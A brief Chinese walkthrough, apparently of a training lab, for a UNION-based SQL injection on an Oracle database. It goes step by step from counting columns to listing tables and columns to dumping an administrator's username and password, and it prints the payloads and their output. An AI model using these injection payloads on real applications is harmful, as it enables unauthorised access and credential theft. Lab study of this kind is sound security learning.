①确定列数  dual
②找到显示位 
③确定数据库类型
④找到表名
```SQL
' UNION SELECT table_name,NULL FROM all_tables--
```
USERS_CVTECL
⑤找到列名
```SQL
' UNION SELECT column_name,NULL FROM all_tab_columns where table_name = 'USERS_CVTECL'--
```
USERNAME_WCSLVG PASSWORD_RCXLBG
⑥取到账号和密码
```SQL
' UNION SELECT USERNAME_WCSLVG,
PASSWORD_RCXLBG FROM USERS_CVTECL--
```
administrator
w748x46ej0bjvk1uhp0e
⑦登录